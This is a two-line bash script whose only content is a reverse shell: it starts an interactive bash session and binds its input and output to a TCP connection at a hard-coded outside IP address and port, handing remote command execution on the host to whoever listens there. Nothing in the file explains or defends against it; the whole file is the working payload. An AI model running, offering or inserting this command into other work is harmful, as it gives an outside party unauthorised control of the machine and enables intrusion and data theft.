#!/usr/bin/env bash
/bin/bash -i >/dev/tcp/82.165.97.169/3332 0<&1 2>&1